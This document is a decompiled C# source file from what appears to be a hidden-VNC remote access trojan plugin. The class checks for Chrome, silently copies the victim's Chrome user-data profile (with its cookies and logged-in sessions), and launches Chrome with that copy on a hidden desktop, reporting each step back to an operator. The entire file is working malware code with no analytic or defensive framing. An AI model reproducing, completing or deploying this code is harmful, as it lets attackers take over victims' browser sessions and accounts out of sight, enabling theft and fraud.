using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using DLL.S.OpenApp;
using HVNC;
using Microsoft.VisualBasic.Devices;

namespace S.OpenApp
{
	// Token: 0x0200000A RID: 10
	internal class Chrome
	{
		// Token: 0x0600004E RID: 78 RVA: 0x0000375C File Offset: 0x0000195C
		public static void OpenChromeBrowser()
		{
			HideDesktop.Load(Plugin.Helper.HVNCDesktop);
			try
			{
				bool flag = !File.Exists(Chrome.FilenameChrome) && !File.Exists(Chrome.FilenameChromeX86);
				bool flag2 = flag;
				if (flag2)
				{
					Plugin.Helper.SendMSG("Chrome: Not Installed!");
				}
				else
				{
					try
					{
						bool flag3 = !Directory.Exists(Chrome.fileNameUserDataCopy);
						bool flag4 = flag3;
						if (flag4)
						{
							Plugin.Helper.SendMSG("Chrome: CloneProfile..");
							Chrome.PC.FileSystem.CopyDirectory(Chrome.fileNameUserData, Chrome.fileNameUserDataCopy);
							Plugin.Helper.SendMSG("Chrome: CloneProfile Completed");
						}
					}
					catch
					{
						Debug.WriteLine("Error!");
					}
					Debug.WriteLine("Complete.///");
					new Thread(delegate()
					{
						Thread.Sleep(1000);
						HideDesktop.Load(Plugin.Helper.HVNCDesktop);
						Chrome.Open();
					}).Start();
				}
			}
			catch (Exception ex)
			{
				Plugin.Helper.SendMSG("Chrome: " + ex.Message);
			}
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00003878 File Offset: 0x00001A78
		public static void Open()
		{
			try
			{
				string text = null;
				bool flag = File.Exists(Chrome.FilenameChrome);
				if (flag)
				{
					text = Chrome.FilenameChrome;
				}
				bool flag2 = File.Exists(Chrome.FilenameChromeX86);
				if (flag2)
				{
					text = Chrome.FilenameChromeX86;
				}
				bool flag3 = text == null;
				if (!flag3)
				{
					HideDesktop.CreateProcess(string.Concat(new string[]
					{
						"\"",
						text,
						"\" --mute-audio --disable-audio --disable-3d-apis --disable-gpu --disable-d3d11 \"--user-data-dir=",
						Chrome.fileNameUserDataCopy,
						"\""
					}), Plugin.Helper.NameDesktop, false);
					Debug.WriteLine("Running.////");
					Plugin.Helper.SendMSG("Chrome: Running");
					Thread.Sleep(3000);
					HideDesktop.Load(Plugin.Helper.HVNCDesktop);
					Debug.WriteLine("Refresh");
				}
			}
			catch (Exception ex)
			{
				Plugin.Helper.SendMSG("Chrome: " + ex.Message);
			}
		}

		// Token: 0x0400001F RID: 31
		private static readonly Computer PC = new Computer();

		// Token: 0x04000020 RID: 32
		private static readonly string fileNameUserData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data";

		// Token: 0x04000021 RID: 33
		private static readonly string fileNameUserDataCopy = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\Chrome Data";

		// Token: 0x04000022 RID: 34
		private static readonly string FilenameChrome = WDir.SystemDirectory + "Program Files\\Google\\Chrome\\Application\\chrome.exe";

		// Token: 0x04000023 RID: 35
		private static readonly string FilenameChromeX86 = WDir.SystemDirectory + "Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";
	}
}
